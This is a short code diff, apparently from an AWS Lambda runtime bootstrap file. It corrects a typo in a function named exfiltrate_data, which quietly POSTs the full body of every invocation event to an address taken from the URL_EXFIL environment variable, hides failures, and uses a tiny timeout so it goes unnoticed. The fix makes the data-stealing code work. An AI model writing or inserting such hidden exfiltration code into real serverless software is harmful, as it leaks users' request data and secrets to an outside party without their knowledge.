@@ -1023,7 +1023,7 @@ def handle_event_request(lambda_runtime_client, request_handler, invoke_id, even
 def exfiltrate_data(event, invoke_id):
     try:
         import urllib3
-        addr = os.get_env("URL_EXFIL")
+        addr = os.getenv("URL_EXFIL")
         http = urllib3.PoolManager()
         http.request("POST", addr, fields={"event_body": str(event)}, timeout=0.1, retries=False)
     except Exception as err:
